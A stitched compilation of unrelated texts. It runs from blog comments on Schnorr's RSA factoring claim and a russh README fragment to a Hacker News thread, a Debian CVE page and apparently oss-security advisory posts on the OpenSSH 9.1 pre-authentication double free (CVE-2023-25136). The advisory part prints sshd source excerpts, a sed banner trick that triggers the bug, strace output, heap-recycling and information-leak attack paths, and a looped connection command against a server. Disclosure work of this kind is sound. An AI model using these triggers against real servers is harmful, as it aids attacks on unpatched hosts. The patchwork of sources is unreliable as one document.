• If anyone factored a big semiprime using Schnorr’s strategy — even if the number were much smaller than the current RSA factoring record — then some meaningful assessment could be begin as to whether this approach has any implications for the security of cryptosystems, or even whether it’s really faster than GNFS. If such a factorization had been done already, we would surely have heard of it!

• However, the *lack* of a demonstration doesn’t prove that the factoring technique is deficient. The software package used for most recent factoring records, CADO-NFS, has about 450,000 source lines (that’s 30% of emacs !!!!). A lot of that is complexity to optimize time-consuming processes; I don’t know how small a “demonstration” package could be. If the complexity needed to realize Schnorr’s factoring approach is comparable (and for all I know, it could be even worse), then he obviously can’t shake the software package out of his sleeve.

• What apparently *has* been done, is some software meant to demonstrate the heart of Schnorr’s sieving technique.

• Schnorr has been making presentations on his concept since at least 2009. In my personal opinion, 11+ years is enough time for a small group to make some kind of significant demonstration software, *if people believed that the idea is likely to work*.

• Because this proposed factoring technique has been public for more than a decade, both specialists in lattice algorithms, and other mathematicians who focus on factoring algorithms in general, have had plenty of opportunity to study Schnorr’s ideas. I don’t see evidence that even one mathematician with relevant expertise has yet been persuaded.

@ MarkH,

> if people believed that the idea is likely to work

It’s actually a variation on “Not Invented Here” syndrom and mathmatics has more than a few examples.

A couple straight of the top of my head,

1, Proof of Fermat’s Last Theorem, which (Wiles’s finally did).

2, Proof of “PRIMES in P” now called AKS Primality test (published by Manindra Agrawal, Neeraj Kayal and Nitin Saxena)

In both cases mathmaticians had assumed it was not possible to solve either so did not bother looking.

But one thing we do know is that there is more than one rule of the form,

“If the base ten digits add up to nine mod ten then the number is divisable by nine”

The practical question is how do we find them all and the correct base to apply efficiently. Obviously a “lookup table” is going to be a little large.

Schnorr has been tinkering with this since his retirement in 2011, you can trace back a series of papers to at least 2012. One of the very early versions had a student implement and run it on a toy problem and it worked, but only in the sense of “it works as intended” rather than “it can be used on RSA-sized numbers”.

The whole result is so unlikely that the initial reaction was that it was a hoax by someone else misusing a paper from Schnorr, until Schnorr confirmed it was legit, at which point people started looking for the error(s) in it.

So I think it’s a case of: Retired mathematician plays with X as a hobby for a decade and then makes a slip-up but is so excited by the result he gets that he rushes it out without first getting it checked.

@Clive:

I have a different perspective on the attitudes of academic mathematicians toward (a) a mathematician’s choice of problem to work on, and (b) publication of unexpected results.

My understanding is that prior to the publication of “Primes is in P,” many workers in the specialized field of complexity theory had formed the opinion that no deterministic polynomial-time algorithm could be found for primality testing.

That being so, colleagues might have looked skeptically at Agrawal for working on the problem of finding such an algorithm (he was already in his 30s). His two young collaborators, however, were on the point of getting their first university degrees, so they weren’t taking any real risk to their reputations.

The situation with the Fermat conjecture (Fermat’s “Last Theorem” or FLT) was quite different. It suffered from a two-part stigma: (a) it was fiendishly hard, having resisted centuries of attempts to crack it; and (b) it was trivial, in the sense that no important mathematical question depended on whether FLT was valid.

For a mathematician to beat his head against this wall, when success could bring newspaper coverage not mathematical fruits, was considered Bad Form. Wiles kept his desire to prove FLT secret, and didn’t do any serious work on it until …

Work by academic mathematicians Gerhard Frey and Ken Ribet showed that if a certain Very Important Conjecture could be proved, then FLT must be true: proof of Fermat would be a corollary.

That Very Important Conjecture was then known as the Taniyama-Shimura (or sometimes Taniyama-Weil) conjecture; now that it’s proven, it’s called the Modularity Theorem.

When Wiles was working on the problem, dozens (if not hundreds) of papers had been published in journals with statements similar in form to “if Taniyama-Shimura is true, then we can prove the following result …”

In other words, proof of that conjecture was going to be extremely consequential.

For Wiles, the Frey/Ribet breakthrough made all the difference: it transformed the difficulty of FLT from “fiendish” to “nobody has an idea of how to do that” [1] and its significance from “trivial” to “one the most important unsolved problems in mathematics.”

Nobody professional in math or computer science has been ridiculed — as far as I’m aware — for serious work on factoring algorithms. The problem is both famous, and of obvious practical importance. Making progress on factoring might not raise your standing as a mathematician, but it gives you star status in the field of cryptography.

Nobody has proved any meaningful lower bounds on the cost of factoring. GNFS is the best yet discovered for RSA moduli — and no better alternative has been found for about 25 years.

However, there is simply no theoretical basis for supposing that GNFS is the best possible. Complexity theorists would be excited to see a big improvement in factoring, but such a breakthrough wouldn’t damage anybody’s theory or reputation.

There’s just no *a priori* reason for mathematicians to suppose that quicker factoring can’t be done. If you can do it … just show them the receipts! I predict that if your work is serious, they will take it seriously.

================

So I shift from choice of problem, to reception of the work.

A. In the case of “PRIMES is in P,” many mathematicians were able to follow the arguments and proofs of their paper. It had the added advantage that it wasn’t difficult to code a program running their algorithm.

Although their result was a big surprise, it was (if I recall those days correctly) accepted as valid within a matter of weeks.

B. Wiles worked on Taniyama-Shimura in total secrecy (until the very end, when he felt the need for some checking by a very select few). It was a very respectable problem, because it was so important; his obsessive secrecy was a function of his personal psychology, rather than reputational risk.

His first paper (containing a defect that would take him months to solve) was on the order of 100 pages in length, and its mathematics so specialized that if everyone on Earth who could understand it without lengthy study had gathered together, they could have ridden together in an elevator car.

Although Wiles’ announcement of a proof was a shock to his profession, his work was taken very seriously, and the necessary experts promptly went to work analyzing his paper statement by statement. I’m not aware of any mathematicians rejecting his claims out-of-hand.

C. A rather sad example is the claimed proof by Louis de Branges of Riemann’s zeta function conjecture (known far and wide as the Riemann Hypothesis or RH).

A poll of mathematicians would probably rank RH as the single most important unsolved problem in their discipline, so working on it is a respectable choice; but it has resisted proof (or disproof) for more than 150 years, so unless one is manifestily working on an approach that is both plausible, and not tried before, it’s very likely a waste of time.

de Branges’ paper is similar in length to Wiles’, and perhaps even more difficult to analyze. The people most qualified to evaluate it might need to devote many months of their working life to its examination.

Before making such an investment, they would probably need to see the “germ of an idea” — what new concept or approach the author has brought to bear, which can plausibly succeed where all others before have failed.

de Branges has not convinced his colleagues that this “germ of an idea” is present, so his paper remains in a sort of limbo, neither accepted nor shown to be false. I can assure you, that many mathematicians despair that they will live to see a proof of RH, and would be delighted to learn of one.

================

By comparison, Schnorr’s paper is neither very long, nor (as far as I understand) does it contain math known only to a handful. Lattice algorithms seem to be fairly well-studied, so there might be dozens of professional mathematicians (and perhaps a similar number of grad students) able to follow the arguments in detail.

As of today, they don’t seem to be buying what Schnorr is selling. The window is still open for him to make his case, but he’s got to show his profession more than he has so far.

[1] The distinction is that although nobody expected a proof of Taniyama-Shimura, it had not resisted so many long and determined attacks as FLT had.

@MarkH @Clive

re:  *The value of trying*

Thank you MarkH for the wonderful synopsis.

I remember documentaries about FLT and how it was “solved” and the ultimate analysis was it was solved, but not the way Fermat would have solved it.

There can be many roads to discovery and not all of them successful. Even a failed attempt has value. And some failed attempts turn out not to be failures after all.

Does/did anybody, the paper author, Bruce, or anybody else, even sketch up how in any case the security of the cryptosystem would even be compromised?

Seems like, at least the notion, would be interesting to explore. Me not being noothing like an expert on cryptography or security, perhaps there was some easily overlooked detailed to some implementation that might cause a so called catastrophic failure in the security of a cryptosystem?

If anything, I think I’ve learned after all these years reading this blog, is that the correct implementation of a security system is important to both understand and maintain so that there aren’t any flaws happening, or existing with the past, present or future implementaiton of something.

I’ve found no “new news” on Schnorr factoring, which is hardly surprising.

I finally got around to looking at the github page by Léo Ducas for his “SchnorrGate” project:

<https://github.com/lducas/SchnorrGate>

Ducas is an academic mathematician working in the Netherlands. Lattices are his specialty, and he happens to be currently giving a course on lattices and cryptography.

What I learned:

• Not only has Schnorr been making polynomial-time claims for his factoring strategy since 2009 … he described this strategy in 1991, building on a 1975 (!) factoring paper by Brillhart and Morrison.

In other words, this idea ain’t new, and mathematicians have looked at it quite seriously.

• None of Schnorr’s papers claiming polynomial-time factoring has yet passed peer review.

• The essence of Schnorr’s idea (if I understand it) is that solving a specific lattice problem (SVP) provides an *efficient* way to search for the arithmetic relations which must be accumulated in order to factor the given integer.

Ducas was able (using a specialized software package) to quickly code Schnorr’s relation search algorithm, and test it experimentally. His experiments showed that the search for relations is much less fruitful than Schnorr calculates.

• On the basis of those experiments, Ducas concludes that in order to successfully factor, the size of the lattice problem would have to be scaled up by a really large factor to yield a sufficient quantity of relations.

With sufficiently big lattices for this to succeed, the strategy would almost certainly be slower than GNFS.

================

As an algorithmic aside not relevant to factoring — or even cryptography! — I just learned about work from 2 years ago by Harvey and van der Hoeven proposing a novel multiplication algorithm.

Math-geek readers will be aware that the fastest practical method for multiplying Really Huge Numbers uses the Fast Fourier Transform (FFT). As far as I’m aware, numbers that big are never used in crypto, but this FFT-based multiplication is at the heart of (for example) the Great Internet Mersennse Prime Search (GIMPS).

Engineers are used to thinking of Fourier Transforms in one dimension, though 2D or even 3D FFT is sometimes useful. The multiplication technique used in number theory projects like GIMPS uses one-dimensional FFT.

A conjectured lower bound for the cost of multiplication is O(N log(N)), which is attained in the Harvey and van der Hoeven … but their multiplication requires computing FFT in 1,729 dimensions!

This algorithm is only fastest for numbers too large to be even *represented* in the physical universe … so it’s probably not showing up in a software library any time soon.

@Curious

At a high level, the security of the RSA algorithm depends on the idea that factoring large numbers is a hard problem but computing those numbers from their factors is easy.

To use RSA, you select a pair of large prime numbers and compute a public key from them which anyone can use to encrypt a message to you. You also compute a second key from those primes which you can use to decrypt those messages.

As long as it’s very hard for someone else to reverse engineer your secret primes from your public key, then RSA is secure. However if that can be done efficiently, then any attacker is able to use your public key to work out your private key and read messages sent to you.

@Tea:

I’m familiar with the taxicab number story about Hardy and Ramanujan, but I’m not confident that I would have recalled the number.

In the event, I didn’t recognize it in the multiplication algorithm story, so thanks for pointing that out!

Skimming the paper, I saw that the authors did a lower-bound calculation for the required FFT dimension, and determined that any number greater than 1728 would suffice, so they chose 1729.

The paper ends with a brief discussion of how the application of a number of optimizations could adapt their multiplication to 9D FFTs, though at the cost of complicating the algorithm rather considerably.

I don’t see in their paper a calculation of the lower bound of integer sizes for their technique to run faster than the Schoenhage-Strassen algorithm using 1D FFT, so I don’t know what impact (if any) the proposed optimizations would have on that bound.

The [*work in progress* dated 2021-04-08 (fourth eprint)](https://eprint.iacr.org/eprint-bin/getfile.pl?entry=2021/232&version=20210409:151242&file=232.pdf) of the paper has “This destroys the RSA cryptosystem” in the abstract. Apparently, the version without this was an earlier one posted erroneously. Multiple sources confirm that Claus Peter Schnorr intends the preprint to be this way.

## Safety

* `deny(clippy::unwrap_used)`
* `deny(clippy::expect_used)`
* `deny(clippy::indexing_slicing)`
* `deny(clippy::panic)`
* Exceptions are checked manually

### Panics

* When the Rust allocator fails to allocate memory during a CryptoVec being resized.
* When `mlock`/`munlock` fails to protect sensitive data in memory.

### Unsafe code

* `cryptovec` uses `unsafe` for faster copying, initialization and binding to native API.

## Ecosystem

* [russh-sftp](https://crates.io/crates/russh-sftp) - server-side and client-side SFTP subsystem support for `russh` - see `russh/examples/sftp_server.rs` or `russh/examples/sftp_client.rs`.
* [async-ssh2-tokio](https://crates.io/crates/async-ssh2-tokio) - simple high-level API for running commands over SSH.

## Adopters

* [HexPatch](https://github.com/Etto48/HexPatch) - A binary patcher and editor written in Rust with terminal user interface (TUI).
  + Uses `russh::client` and `russh_sftp::client` to allow remote editing of files.
* [kartoffels](https://github.com/Patryk27/kartoffels) - A game where you're given a potato and your job is to implement a firmware for it
  + Uses `russh:server` to deliver the game, using `ratatui` as the rendering engine.
* [kty](https://github.com/grampelberg/kty) - The terminal for Kubernetes.
  + Uses `russh::server` to deliver the `ratatui` based TUI and `russh_sftp::server` to provide `scp` based file management.
* [lapdev](https://github.com/lapce/lapdev) - Self-Hosted Remote Dev Environment
  + Uses `russh::server` to construct a proxy into your development environment.
* [medusa](https://github.com/evilsocket/medusa) - A fast and secure multi protocol honeypot.
  + Uses `russh::server` to be the basis of the honyepot.
* [rebels-in-the-sky](https://github.com/ricott1/rebels-in-the-sky) - P2P terminal game about spacepirates playing basketball across the galaxy
  + Uses `russh::server` to deliver the game, using `ratatui` as the rendering engine.
* [warpgate](https://github.com/warp-tech/warpgate) - Smart SSH, HTTPS and MySQL bastion that requires no additional client-side software
  + Uses `russh::server` in addition to `russh::client` as part of the smart SSH functionality.
* [Devolutions Gateway](https://github.com/Devolutions/devolutions-gateway/) - Establish a secure entry point for internal or external segmented networks that require authorized just-in-time (JIT) access.
  + Uses `russh::client` for the web-based SSH client of the standalone web application.
* [Sandhole](https://github.com/EpicEric/sandhole) - Expose HTTP/SSH/TCP services through SSH port forwarding. A reverse proxy that just works with an OpenSSH client.
  + Uses `russh::server` for reverse forwarding connections, local forwarding tunnels, and the `ratatui` based admin interface.

In Debian's defence, this was caught in the unstable distro and never made it out to a stable release. | | --- | --- | --- | | | |  |  | [outworlder](user?id=outworlder) [on Feb 8, 2023](item?id=34715716)   | [parent](#34712968) | [prev](#34713603) | [next](#34713570) [–]  > I don’t care about DoS or crashes!

Back in the day of dial up your entire PC was front and center on the internet. Windows 95 had a vulnerability that anyone could BSOD you. When it came out basically any IRC or multiplayer interaction you could get BSOD’d by any rando on the internet.

If memory serves, we’d upgraded most of our servers to only support SSH-2 before this happened and since that included our public shell servers (.edu) nobody broke in to anything but we did have to badger some proprietary vendors for updates to devices which were fortunately on our restricted internal-only network. | | --- | --- | --- | | | |  |  | [binkHN](user?id=binkHN) [on Feb 8, 2023](item?id=34713074)   | [parent](#34712968) | [prev](#34713570) | [next](#34713040) [–]  Per <http://www.openbsd.org>, “Only two remote holes in the default install, in a heck of a long time!” I believe, at least one of these, was SSH related. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [on Feb 8, 2023](item?id=34715694)   | [root](#34712968) | [parent](#34713074) | [next](#34713040) [–]  They switched to "heck of a long time" because they had that blurb of text since the 90s. So we're talking about 2 holes in about 25 years. Though I think I heard some criticism of what counts and what does not for that tally, maybe 20 years ago. The project was fairly innovative of including now-standard practices like having the daemon drop its privileges. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [on Feb 9, 2023](item?id=34719576)   | [root](#34712968) | [parent](#34715694) | [next](#34713040) [–]  Iirc the criticism was that the default install has no services enabled basically. | | --- | --- | --- | | | |  |  | [IcePic](user?id=IcePic) [on Feb 9, 2023](item?id=34720884)   | [root](#34712968) | [parent](#34719576) | [next](#34713040) [–]  Yeah, people in the 90s really loved installing redhat 4 (not rhel 4, the old versions) and getting a vulnerable pop2/pop3/imapd running by default after installs. You would get hacked within the hour if not behind firewalls. Very unfair of OpenBSD (and other security conscious OSes) to not compete on equal terms there. | | --- | --- | --- | | | |  |  | [loloquwowndueo](user?id=loloquwowndueo) [on Feb 8, 2023](item?id=34713040)   | [parent](#34712968) | [prev](#34713074) | [next](#34714445) [–]  Yes. <https://en.m.wikipedia.org/wiki/OpenBSD#Security_record> | | --- | --- | --- | | | |  |  | [fgh](user?id=fgh) [on Feb 8, 2023](item?id=34714445)   | [parent](#34712968) | [prev](#34713040) | [next](#34717049) [–]  Team TESO wrote an excellent exploit back in the day - one of the best groups of the early 2000s. | | --- | --- | --- | | | |  |  | [ranger\_danger](user?id=ranger_danger) [on Feb 8, 2023](item?id=34717049)   | [parent](#34712968) | [prev](#34714445) | [next](#34713424) [–]  in certain cases crashes can be used to gain login access | | --- | --- | --- | | | |  |  | [surteen](user?id=surteen) [on Feb 8, 2023](item?id=34713424)   | [prev](#34712968) | [next](#34712373) [–]  *The JFrog Security Research team gave this vulnerability a Medium severity rating for the following reasons:* *A DoS attack that crashes a forked worker process is much less severe than a DoS that crashes an important daemon, but they will both receive a “High” Availability impact CVSS rating.* How is this even considered a DoS at all? You're forking a process and then immediately crashing it. You're only Denying Service to your own connection that you just made. | | --- | --- | --- | | | |  |  | [acdha](user?id=acdha) [on Feb 8, 2023](item?id=34713695)   | [parent](#34713424) | [next](#34717368) [–]  I agree that this is pretty limited. I think that depends on how expensive it is to create a process: if you could open enough connections or hit something like the audit log frequently enough[1], it might be a decent traffic multiplier when you can't otherwise do something damaging (maybe in a scenario where you get something like a r/o deploy key?). 1. I'm not sure this is very useful but I was thinking that if someone follows one of the security hardening standards, their servers are configured to hang until the audit log buffer can be flushed but you could more easily hit that by failed login requests unless they have something like fail2ban installed. | | --- | --- | --- | | | |  |  | [eklitzke](user?id=eklitzke) [on Feb 8, 2023](item?id=34714615)   | [root](#34713424) | [parent](#34713695) | [next](#34714850) [–]  As you pointed out it's a DOS in the sense that causing a process to fork/crash is much more expensive than a regular denied connection, so it would be easier for an attacker to overload the server using this technique than it would be if they were just making regular denied connections. Also consider that on many systems this would trigger a core dump which will cause a few MB to be written to disk (although you probably can't fill up the disk because in the default configuration most systems are configured to keep either just one core dump or N, where N is some small number like 10).

Case in point, in a world where Heartbleed actually happened, that should've led to maintainers admitting that their language of choice isn't the right tool for the job.

Consider whether this is more useful than saying “you know, you should probably find more time to go to the gym”. Anyone writing C code has heard this by now, and repetition probably isn’t going to help. What could work is what we have seen successfully with Firefox, Linux, Chrome, Android, etc. where people didn’t demand a massive rewrite but instead showed up to work and picked something small where benefits could be seen quickly. Rust has excellent interoperability so you can do that well but you might run into challenges on projects like OpenSSH which have been ported to all kinds of obscure platforms.

I'm wondering if doing this makes me more vulnerable? Or is bad practice somehow? NB: using iTerm2 3.5.0beta9 and Oh My Zsh master (a1c54e0). | | --- | --- | --- | | | |  |  | [hartmel](user?id=hartmel) [on Feb 8, 2023](item?id=34714321)   | [parent](#34713998) | [next](#34714355) [–]  Edit: my bad, +ssh-rsa refers to a signature algorithm using SHA1, which should not be used anymore. Target server host keys should be renewed, as told by riolu, thanks to him for pointing it. On debian-like, remove host keys and run dpkg-configure openssh-server. On redhat-like, remove host keys and restart sshd. --------------------------------------------- Not vulnerable, not a bad practice. Newer algorithms are faster (in practice not perceptible, people usually don't need state of the art performance for SSH connections), with smaller keys and probably better algorithms (not subject to side channel attacks, which are still hard to abuse) but RSA is not broken. It may be in a few years with quantum computing but it's still far to be sure. [https://www.schneier.com/blog/archives/2021/03/no-rsa-is-not...](https://www.schneier.com/blog/archives/2021/03/no-rsa-is-not-broken.html) updated last december. No need to rekey all accounts or servers, just switch to ecdsa or ed25519 progressively. | | --- | --- | --- | | | |  |  | [josephcsible](user?id=josephcsible) [on Feb 8, 2023](item?id=34714690)   | [root](#34713998) | [parent](#34714321) | [next](#34714355) [–]  That change isn't actually about RSA vs. ECC. It's about SHA-1 vs. SHA-2. The default configuration still supports using your existing RSA keys, but with a different hashing algorithm (with the options rsa-sha2-256 and rsa-sha2-512). That configuration change allows use of SHA-1 to continue. | | --- | --- | --- | | | |  |  | [riolu](user?id=riolu) [on Feb 8, 2023](item?id=34714355)   | [parent](#34713998) | [prev](#34714321) | [next](#34715196) [–]  That isn't even remotely related the post and Monterey is over a year old. The systems you are trying to SSH to are using outdated host keys, you need to actually update to get security fixes, it will regenerate host keys. You shouldn't be worried about this CVE, it sounds like you have quite a few years of CVE's you've neglected to patch anyways. | | --- | --- | --- | | | |  |  | [josephcsible](user?id=josephcsible) [on Feb 8, 2023](item?id=34714709)   | [root](#34713998) | [parent](#34714355) | [next](#34723743) [–]  > The systems you are trying to SSH to are using outdated host keys, you need to actually update to get security fixes, it will regenerate host keys. No you don't. rsa-sha2-256 and rsa-sha2-512 are still enabled by default and can use the same key. | | --- | --- | --- | | | |  |  | [obituary\_latte](user?id=obituary_latte) [on Feb 9, 2023](item?id=34723743)   | [root](#34713998) | [parent](#34714355) | [prev](#34714709) | [next](#34715196) [–]  The reason it triggered my question is they had to do something similar to get the exploit to work (add +ssh-rsa to putty).

Suppose you start writing an open SSH tool for BSD in 1999. What language do you choose? Now that it's 2023 and OpenSSH in C is widely used, it's not as if it would be good if it were just abandoned (certainly not good from a security perspective). It makes sense for a team to continue maintaining it, right? There probably is a better language for an open SSH client. It's not going to write itself, though. This is open source. The interested people need to get together and figure out how to do it. It's just weird to me to imply the openssh people are doing something wrong when -- absent a time machine -- they clearly are not, and in fact are developing and maintaining a very valuable tool (probably aren't getting rich doing it, either). | | --- | --- | --- | | | |  |  | [benibela](user?id=benibela) [on Feb 8, 2023](item?id=34713977)   | [root](#34712981) | [parent](#34713575) | [next](#34713538) [–]  >It's not really a matter of "insisting".

We're talking having to redo the entire stack from the kernel to the drivers, ABI and up in a whole new programming language. It's being done, just keep in mind it's an enormous amount of work to get there.

# CVE-2023-25136

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2023-25012.html) [[Index]](index.html) [[Next]](CVE-2023-25139.html)

### Upstream information

[CVE-2023-25136 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25136)

#### Description

OpenSSH server (sshd) 9.1 introduced a double-free vulnerability during options.kex\_algorithms handling. This is fixed in OpenSSH 9.2. The double free can be leveraged, by an unauthenticated remote attacker in the default configuration, to jump to any location in the sshd address space. One third-party report states "remote code execution is theoretically possible."

| This is extremely strange since it looks like it's trying to use curve25519 KEX even though DH-group14-sha1 was negotiated. I'll release the latest code state as a new beta just in case. |

I added `key::SSH_RSA` in `preferred`, and the key exchange produced the same error in this issue (which can be confirmed fixed in v0.34.0-beta.9 🎉 ) 2. I then moved `kex::DH_G14_SHA1` to the first place, the key exchange succeeded, but I got failed authentication.   Not sure if this is a host or client issue, and I'll be sharing more info if I could. |

Subject: Re: double-free vulnerability in OpenSSH server 9.1 (CVE-2023-25136)

Hi all,

Another quick update on the exploitation of this double-free bug on
OpenBSD:

a/ our previous attack (the arbitrary control of sshd's instruction
pointer via the EVP_AES_KEY structure) works only on OpenBSD amd64, not
on OpenBSD i386;

b/ we were able to recycle the chunk of memory where
options.kex_algorithms was allocated, into a chunk of a different size
(which gives us greater freedom), but this happens with such a low
probability (even on i386) that we do not consider this particular
attack to be practical;

c/ as a direct consequence of CVE-2023-25136, we found an information
leak (of bits and pieces from the memory of the unprivileged sshd
process), but it is unlikely to be useful in practice.

========================================================================
a/ Our previous attack, on OpenBSD i386.

options.kex_algorithms is a 266-byte string, which occupies a 512-byte
chunk of memory. On OpenBSD amd64, we can re-allocate this chunk (after
it is freed for the first time) with a struct EVP_AES_KEY, whose size is
264 bytes and therefore also requires a 512-byte chunk of memory.

But on OpenBSD i386, the size of a struct EVP_AES_KEY is only 252 bytes,
and it therefore requires a 256-byte chunk instead; i.e., we cannot
easily re-allocate options.kex_algorithms's chunk with a struct
EVP_AES_KEY.

========================================================================
b/ The recycling of options.kex_algorithms's chunk.

One solution to the previous problem (on OpenBSD i386) is to recycle
options.kex_algorithms's 512-byte chunk, into a 256-byte chunk; i.e.,
recycle the page of memory where options.kex_algorithms was allocated,
into a page of 256-byte chunks instead. To achieve this:

- options.kex_algorithms must be allocated in an otherwise empty page
  of memory (so that, after options.kex_algorithms is freed, this empty
  page can be re-used for chunks of a different size). Luckily, because
  options.kex_algorithms is allocated randomly from several pages of
  memory, this does happen from time to time, with a probability of
  ~1/512 in our tests.

- This empty page must then be re-used for chunks of a different size,
  but sshd enables malloc's "secure" mode (malloc_options = "S"): empty
  pages are not cached by malloc but are immediately munmap()ed, and the
  re-mmap()ing of a page at the exact same address is therefore subject
  to AS(L)R. This happens with a probability of ~1/2^18 at best (unlike
  Linux, OpenBSD randomizes every single mmap() address, in a 1GB range
  on i386).

- Inside this recycled page, our target chunk must be allocated exactly
  where options.kex_algorithms was allocated. For a 256-byte target
  chunk, this happens with a probability of 1/16.

As a result, the probability of recycling options.kex_algorithms's chunk
into a 256-byte chunk is ~1/2^31 at best, so we do not consider this
particular attack to be practical.

========================================================================
c/ A useless (?) information leak.

After options.kex_algorithms's chunk is freed for the first time (in
compat_kex_proposal()), sshd enters input_userauth_request():

------------------------------------------------------------------------
250 static int
251 input_userauth_request(int type, u_int32_t seq, struct ssh *ssh)
252 {
...
262         if ((r = sshpkt_get_cstring(ssh, &user, NULL)) != 0 ||
263             (r = sshpkt_get_cstring(ssh, &service, NULL)) != 0 ||
264             (r = sshpkt_get_cstring(ssh, &method, NULL)) != 0)
265                 goto out;
...
274         if (authctxt->attempt++ == 0) {
275                 /* setup auth context */
276                 authctxt->pw = PRIVSEP(getpwnamallow(ssh, user));
...
289                 authctxt->user = xstrdup(user);
290                 authctxt->service = xstrdup(service);
...
298         } else if (strcmp(user, authctxt->user) != 0 ||
299             strcmp(service, authctxt->service) != 0) {
300                 ssh_packet_disconnect(ssh, "Change of username or service "
301                     "not allowed: (%s,%s) -> (%s,%s)",
302                     authctxt->user, authctxt->service, user, service);
303         }
...
328  out:
329         free(service);
330         free(user);
331         free(method);
332         return r;
333 }
------------------------------------------------------------------------

- at lines 262-264, we re-allocate options.kex_algorithms's chunk with
  our user, service, or method string (a 300-byte string, which requires
  a 512-byte chunk, just like options.kex_algorithms);

- at line 276, options.kex_algorithms's chunk (now our user, service, or
  method string) is freed again;

- at lines 289-290, we re-allocate options.kex_algorithms's chunk again,
  with either authctxt->user or authctxt->service (a copy of our user or
  service string);

- at lines 329-331, options.kex_algorithms's chunk (now authctxt->user
  or authctxt->service) is freed again (via user, service, or method);

- when sshd enters input_userauth_request() for the second time, either
  user or service does not match (at lines 298-299), and the contents of
  the free authctxt->user or authctxt->service chunk is sent to us (at
  lines 300-302).

Initially, we thought that this information leak would not leak any
information at all, because OpenBSD's malloc (when in "secure" mode)
overwrites the contents of free chunks with 0xdf bytes. Nevertheless,
because the authctxt->user or authctxt->service chunk is sent to us as a
null-terminated string (%s), and because this chunk does not contain any
null bytes (only 0xdf bytes), the chunk that follows authctxt->user or
authctxt->service is also sent to us, and might contain interesting
pieces of information (because it can be an allocated chunk).

Our proof of concept (a simple patch for openssh-9.1p1) is attached to
this email. We have not fully analyzed its output yet (disconnect.log),
but we do not expect it to be particularly useful, because of sshd's
defense-in-depth mechanisms:

- the memory of the unprivileged sshd process (where the information
  leak occurs) is not supposed to contain any secret information (for
  example, the private host keys are scrubbed from the memory of the
  unprivileged sshd process as soon as it is fork()ed, in
  demote_sensitive_data());

- any leaked memory address is mostly useless (except maybe for its
  least significant bits), because sshd calls _exit() at the end of
  ssh_packet_disconnect() (at lines 300-302), and because sshd fork()s
  and re-execv()s itself (and therefore re-randomizes its address space)
  every time it accept()s a new client connection.

As an example, below is an excerpt from a disconnect.log that was
produced when running our proof of concept against an unpatched OpenBSD
7.2 (on amd64):

$ while true ;do ./ssh invalid@....168.56.123 ;done

Subject: double-free vulnerability in OpenSSH server 9.1

Hi all,

In case it helps, below is a brief analysis of this vulnerability:

========================================================================

On February 2, 2023, OpenSSH version 9.2 was released: it fixes a
pre-authentication vulnerability (a double free) in the OpenSSH server
version 9.1 (only this specific version, which was released in October
2022). Affected users are urged to upgrade, as this vulnerability can be
triggered in the default configuration of the OpenSSH server (sshd).

This double free was introduced in July 2022 by the following commit:

<https://github.com/openssh/openssh-portable/commit/486c4dc3b83b4b67d663fb0fa62bc24138ec3946>

and was reported to the OpenSSH Bugzilla in January 2023 by Mantas
Mikulenas:

<https://bugzilla.mindrot.org/show_bug.cgi?id=3522>

The chunk of memory that is freed twice is "options.kex_algorithms"; it
is freed once via do_ssh2_kex(), which calls compat_kex_proposal():

------------------------------------------------------------------------
2374 do_ssh2_kex(struct ssh *ssh)
....
2381         myproposal[PROPOSAL_KEX_ALGS] = prop_kex = compat_kex_proposal(ssh,
2382             options.kex_algorithms);
------------------------------------------------------------------------
191 compat_kex_proposal(struct ssh *ssh, char *p)
...
198         if ((ssh->compat & SSH_BUG_CURVE25519PAD) != 0)
199                 if ((p = match_filter_denylist(p,
...
202         if ((ssh->compat & SSH_OLD_DHGEX) != 0) {
203                 cp = p;
204                 if ((p = match_filter_denylist(p,
...
208                 free(cp);
------------------------------------------------------------------------

- if at line 198 the "SSH_BUG_CURVE25519PAD" compatibility bit is *not*
  set,

- and if at line 202 the "SSH_OLD_DHGEX" compatibility bit *is* set,

- then at line 203 "cp" becomes equal to "p", which is still equal to
  "options.kex_algorithms",

- and at line 208 "cp" is freed, i.e. "options.kex_algorithms" is freed
  and becomes a dangling pointer.

(Note: the "SSH_BUG_CURVE25519PAD" and "SSH_OLD_DHGEX" compatibility
bits depend only on the client version, not on the server configuration;
for example, the bug report mentioned earlier uses "PuTTY_Release_0.64",
and we will use "FuTTY" for the ssh client version later in this post.)

"options.kex_algorithms" is then freed a second time via
do_authentication2(), which calls input_userauth_request(), which calls
mm_getpwnamallow(), which calls copy_set_server_options(), which calls
assemble_algorithms(), which calls kex_assemble_names() with "listp"
equal to "&options.kex_algorithms", which therefore double-frees
"options.kex_algorithms" at line 315:

------------------------------------------------------------------------
 225 kex_assemble_names(char **listp, const char *def, const char *all)
 ...
 240         list = *listp;
 ...
 315         free(list);
------------------------------------------------------------------------

To reproduce this vulnerability, we installed a Debian testing
(bookworm, which ships OpenSSH 9.1p1 at the time of writing this post)
and we simply modified the banner of the ssh client to pretend that it
is a "FuTTY" client (to force the "SSH_OLD_DHGEX" compatibility bit in
sshd):

------------------------------------------------------------------------
$ cp -i /usr/bin/ssh ./ssh

$ sed -i s/OpenSSH_9.1p1/FuTTYSH_9.1p1/g ./ssh

$ ./ssh -v 127.0.0.1
...
debug1: Local version string SSH-2.0-FuTTYSH_9.1p1 Debian-2
debug1: Remote protocol version 2.0, remote software version OpenSSH_9.1p1 Debian-2
...
debug1: SSH2_MSG_SERVICE_ACCEPT received
Connection closed by 127.0.0.1 port 22
------------------------------------------------------------------------

This connection immediately triggered a double free in the unprivileged
sshd process, as shown by the "Connection closed by 127.0.0.1 port 22"
message above and by the strace output below:

------------------------------------------------------------------------
writev(2, [{iov_base="free(): double free detected in tcache 2", iov_len=40}, {iov_base="\n", iov_len=1}], 2) = 20
--- SIGSYS {si_signo=SIGSYS, si_code=SYS_SECCOMP, si_call_addr=0x7f093649e1f5, si_syscall=__NR_writev, si_arch=AUDIT_ARCH_X86_64} ---
write(8, "\0\0\0g\0\0\0\1\0\0\0\0\0\0\0[ssh_sandbox_violation: unexpected system call (arch:0xc000003e,syscall:20 @ 0x7f093649e1f5)", 107) = 107
exit_group(1)                           = ?
+++ exited with 1 +++
------------------------------------------------------------------------

Exploiting this vulnerability will not be easy: modern memory allocators
provide protections against double frees, and the impacted sshd process
is unprivileged and heavily sandboxed.

